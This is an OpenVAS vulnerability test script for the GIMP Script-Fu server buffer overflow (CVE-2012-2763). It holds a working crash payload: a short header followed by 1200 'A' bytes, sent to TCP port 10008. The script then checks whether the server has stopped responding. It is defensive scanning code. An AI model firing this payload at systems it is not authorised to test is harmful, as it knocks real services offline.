###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gimp_script_fu_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# GIMP Script-Fu Server Buffer Overflow Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to gain control of EIP and
  potentially execute arbitrary code.
  Impact Level: System/Application";
tag_affected = "GIMP version 2.6.12 and prior";
tag_insight = "The script-fu server process in GIMP fails to handle a specially crafted
  command input sent to TCP port 10008, which could be exploited by remote
  attackers to cause a buffer overflow.";
tag_solution = "Upgrade to GIMP version 2.8.0 or later,
  For updates refer to http://www.gimp.org/";
tag_summary = "This host is running GIMP Script-Fu Server and is prone to buffer
  overflow vulnerability.";

if(description)
{
  script_id(802878);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-2763");
  script_bugtraq_id(53741);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-06-27 13:12:09 +0530 (Wed, 27 Jun 2012)");
  script_name("GIMP Script-Fu Server Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/82429");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49314");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18956");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18973");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/113201/GIMP-script-fu-Server-Buffer-Overflow.html");
  script_xref(name : "URL" , value : "http://www.reactionpenetrationtesting.co.uk/advisories/scriptfu-buffer-overflow-GIMP-2.6.html");

  script_description(desc);
  script_summary("Check if GIMP Script-Fu Server is vulnerable to buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports(10008);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Variable Initialization
res  = "";
exploit = "";
soc  = 0;
port = 0;

## Default Realwin Port
port = 10008;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Send a Test msg to check if server is responding
testmsg ='\x47\x00\x04\x74\x65\x73\x74';

send(socket:soc, data: testmsg);
res = recv_line(socket:soc, length:100);
res = hexstr(res);

## Check the response first byte 0x47 (Magic byte 'G')
## and second byte 0x00 for error (0 on success, 1 on error)
if(!res || !(res =~ "^470100"))
{
 close(soc);
 exit(0);
}

## Construct Crafted Exploit and Send
exploit = crap(data:"A", length: 1200);
exploit = '\x47\x04\xB0' + exploit;

send(socket:soc, data: exploit);
sleep(5);

## Send Test msg again to confirm server is crashed
send(socket:soc, data: testmsg);
res = recv_line(socket:soc, length:100);
close(soc);

if(!res){
  security_hole(port);
}
